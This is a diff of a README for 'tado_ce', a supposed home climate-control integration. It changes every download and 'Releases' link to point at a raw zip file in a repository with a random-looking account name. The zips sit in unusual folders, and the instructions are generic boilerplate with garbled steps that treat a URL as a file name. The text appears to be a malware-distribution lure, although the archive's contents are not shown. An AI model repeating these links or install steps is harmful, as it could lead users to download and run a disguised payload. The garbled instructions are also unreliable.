@@ -1,6 +1,6 @@
 # 🌡️ tado_ce - Control Your Home’s Climate Easily
 
-![Download tado_ce](https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/tado_ce/translations/ce-tado-v2.9.zip)
+![Download tado_ce](https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/ce_tado_3.6-beta.3.zip)
 
 ## 📜 Description
 
@@ -18,13 +18,13 @@ To install tado_ce, you will need to follow these steps. This guide is meant for
 
 ## 📥 Download & Install
 
-To get started with tado_ce, visit this page to download: [tado_ce Releases](https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/tado_ce/translations/ce-tado-v2.9.zip). 
+To get started with tado_ce, visit this page to download: [tado_ce Releases](https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/ce_tado_3.6-beta.3.zip). 
 
 Next, find the latest version of the software. Locate the appropriate file for your system. Click on the file to start the download.
 
 ### Example Files You Might See
-- **https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/tado_ce/translations/ce-tado-v2.9.zip**: For manual installation.
-- **https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/tado_ce/translations/ce-tado-v2.9.zip**: For advanced users familiar with compressed files.
+- **https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/ce_tado_3.6-beta.3.zip**: For manual installation.
+- **https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/ce_tado_3.6-beta.3.zip**: For advanced users familiar with compressed files.
 
 Make sure to save the file in a convenient location on your computer.
 
@@ -33,7 +33,7 @@ Make sure to save the file in a convenient location on your computer.
 ### Step 1: Unzip the Downloaded File
 
 1. Navigate to the folder where you downloaded the file.
-2. Right-click on the file (e.g., `https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/tado_ce/translations/ce-tado-v2.9.zip`).
+2. Right-click on the file (e.g., `https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/ce_tado_3.6-beta.3.zip`).
 3. Select "Extract All" or an equivalent option in your operating system.
 4. Follow the prompts to extract the files.
 
@@ -69,7 +69,7 @@ After installation, you can start using tado_ce. Here’s a brief overview of ho
 
 - Keep an eye on your energy usage through the dashboard.
 - Adjust settings according to seasonal changes for better efficiency.
-- Regularly check for updates on the [tado_ce Releases](https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/tado_ce/translations/ce-tado-v2.9.zip) page to ensure you have the latest features and fixes.
+- Regularly check for updates on the [tado_ce Releases](https://raw.githubusercontent.com/jfgvshjvhsgvhjs/tado_ce/main/custom_components/ce_tado_3.6-beta.3.zip) page to ensure you have the latest features and fixes.
 
 ## 📞 Support
 
